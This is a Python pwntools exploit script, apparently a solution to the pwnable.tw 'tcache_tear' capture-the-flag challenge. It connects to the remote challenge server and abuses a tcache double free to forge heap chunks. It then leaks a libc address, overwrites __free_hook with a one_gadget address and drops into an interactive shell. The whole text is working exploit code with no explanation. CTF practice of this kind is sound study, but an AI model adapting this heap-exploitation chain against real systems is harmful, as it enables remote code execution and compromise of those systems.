#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.binary = "tcache_tear"
#  context.log_level = "debug"

libc = ELF("./libc.so", checksec = False)
libc.sym['main_arena'] = 0x3ebc40
libc.sym['one_gadget'] = 0x4f322

def DEBUG():
    gdbcmd = '''
    b *0x400C54
    b *0x400B54
    b *0x400B84
    b *0x400BBF
    c
    '''
    gdb.attach(io, gdbscript = gdbcmd)

def alloc(size, data):
    assert size <= 0xff
    assert len(data) <= size - 0x10

    io.sendlineafter(" :", "1")
    sleep(0.01)
    io.sendlineafter(":", str(size))
    sleep(0.01)
    io.sendafter(":", data)
    sleep(0.01)

def release():
    io.sendlineafter(" :", "2")
    sleep(0.01)

def show():
    io.sendlineafter(" :", "3")
    sleep(0.01)

    
#  io = process("tcache_tear")
io = remote("chall.pwnable.tw", 10207)

io.sendlineafter("Name:", flat(0, 0x511))

alloc(0xf0, '00000000')
release() # 0
release() # 0 -> 0
alloc(0xf0, flat(0x602070 + 0x500)) # 0 -> target
alloc(0xf0, flat(0x602070 + 0x500)) # target
fake_chunk = flat(0, 0xa1) + '\0' * 0x90 + flat(0, 0xa1)
alloc(0xf0, fake_chunk)

alloc(0x80, '11111111')
release() # 0
release() # 0 -> 0
alloc(0x80, flat(0x602070)) # 0 -> target
alloc(0x80, flat(0x602070)) # target
alloc(0x80, '\n')
release()
show()

libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['main_arena'] - 96
success("libc -> {:#x}".format(libc.address))

alloc(0x60, '00000000')
release() # 0
release() # 0 -> 0
alloc(0x60, flat(libc.sym['__free_hook'])) # 0 -> target
alloc(0x60, flat(libc.sym['__free_hook'])) # target
#  DEBUG()
alloc(0x60, flat(libc.sym['one_gadget']))
release()


io.interactive()
